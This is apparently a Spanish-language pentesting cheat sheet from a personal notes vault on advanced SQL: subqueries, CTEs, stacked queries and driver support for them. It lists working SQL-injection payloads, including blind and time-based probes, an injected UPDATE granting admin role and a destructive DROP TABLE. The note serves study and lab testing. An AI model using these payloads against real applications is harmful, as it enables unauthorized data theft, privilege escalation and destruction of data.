---
aliases:
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: CheatSheet
linked:
  - "[[SQL Commands]]"
---
# SQL - Subconsultas y Estructuras Avanzadas

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SELECT (SELECT password FROM users WHERE id=1)` | Subquery que devuelve 1 valor | Inline value retrieval — base de blind. |
| `WHERE x = (SELECT MAX(id) FROM users)` | Filtra por resultado de subquery | Dynamic filtering. |
| `WHERE EXISTS (SELECT 1 FROM users WHERE username='admin')` | TRUE si subquery tiene filas | Boolean blind sin SUBSTRING. |
| `WHERE id IN (SELECT id FROM admins)` | Match contra lista de subquery | Bulk filtering. |
| `WHERE col = (SELECT col FROM ext WHERE ext.id = main.id)` | Correlated subquery — eval por fila | Comparison contextual fila a fila. |
| `WITH cte AS (SELECT id FROM users) SELECT * FROM cte` | CTE (Common Table Expression) | Queries complejas más legibles. PG/MSSQL/MySQL 8+. |
| `WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n<100) SELECT * FROM t` | CTE recursiva — genera serie | Generación dinámica de filas (bypass time-based con loops). |
| `'; INSERT INTO logs VALUES('x')-- -` | Stacked query — segunda sentencia ejecuta | Backend con stacked support (MSSQL/PG/Java/.NET). |
| `'; UPDATE users SET role='admin' WHERE id=2-- -` | UPDATE inyectada via stacked | Mismo, modificación destructiva. |
| `'; DROP TABLE users-- -` | Destrucción de tabla | DESTRUCTIVO — solo en CTF/labs. |
| `'; CREATE TABLE shells (cmd text); INSERT INTO shells VALUES ('id')-- -` | Setup para extraer data via canal alternativo | Stacked + storage. |
| `SELECT IF((SELECT count(*) FROM users WHERE username='admin')=1, SLEEP(5), 0)` | Boolean → time delay como signal | Time-based blind con subquery EXISTS. |
^sql-avanzado

### Subquery vs JOIN — when to use

```sql
-- Subquery (scalar) — UN valor
SELECT name, (SELECT count(*) FROM orders WHERE user_id=u.id) AS cnt FROM users u;

-- JOIN — más eficiente para múltiples filas/columnas
SELECT u.name, COUNT(o.id) FROM users u LEFT JOIN orders o ON o.user_id=u.id GROUP BY u.name;

-- En SQLi típicamente preferimos subqueries porque pueden ir en cualquier expr
WHERE id = (SELECT id FROM users LIMIT 0,1)
```

### Stacked queries — soporte por driver

| Driver | Stacked |
|:---:|:---:|
| PHP `mysqli_query()` | ❌ |
| PHP `mysqli_multi_query()` | ✅ |
| PHP PDO MySQL (default) | ❌ |
| PHP PDO con `PDO::ATTR_EMULATE_PREPARES=true` | ✅ |
| PHP `mssql_query`/`sqlsrv_query` | ✅ |
| Java JDBC | ✅ |
| .NET SqlCommand | ✅ |
| Node mysql2 | ❌ (default), ✅ con `multipleStatements: true` |
| Python `mysql.connector` | ❌ |

___

## Overview

**Subqueries** = queries anidadas. Núcleo de SQLi avanzada:

- **Scalar subquery** en expression — `WHERE x = (SELECT ...)` para inyectar valor único.
- **Correlated subquery** — eval por cada fila, costosa pero flexible.
- **CTE** (`WITH`) — legibilidad + recursión.
- **Recursive CTE** — generador de series (bypass time-based con loop).

**Stacked queries** = vector raro pero letal — ejecutar sentencias arbitrarias (`INSERT`/`UPDATE`/`DROP`/`CREATE`). PHP+MySQL default = ❌, pero MSSQL+Java/.NET = ✅.

Identificar driver del backend determina si stacked es viable. Si no, todo va via UNION/subquery en single SELECT.

***
